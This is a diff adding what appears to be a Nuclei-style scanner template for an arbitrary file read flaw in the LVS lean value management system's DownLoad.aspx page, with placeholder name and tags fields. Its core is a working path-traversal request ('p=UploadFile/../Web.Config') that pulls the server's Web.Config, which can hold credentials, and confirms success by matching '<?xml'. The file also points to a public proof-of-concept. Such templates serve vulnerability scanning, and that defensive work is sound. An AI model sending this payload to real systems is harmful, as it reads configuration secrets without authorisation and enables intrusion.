@@ -1,0 +1,19 @@
+id: lvs-DownLoad-fileread
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: LVS精益价值管理系统DownLoad.aspx存在任意文件读取漏洞
+  reference:
+    - https://github.com/wy876/POC/blob/3731c2067d80483223603737037eff2ed3c44425/LVS%E7%B2%BE%E7%9B%8A%E4%BB%B7%E5%80%BC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FDownLoad.aspx%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md?plain=1#L16
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Business/DownLoad.aspx?p=UploadFile/../Web.Config"
+      
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml'
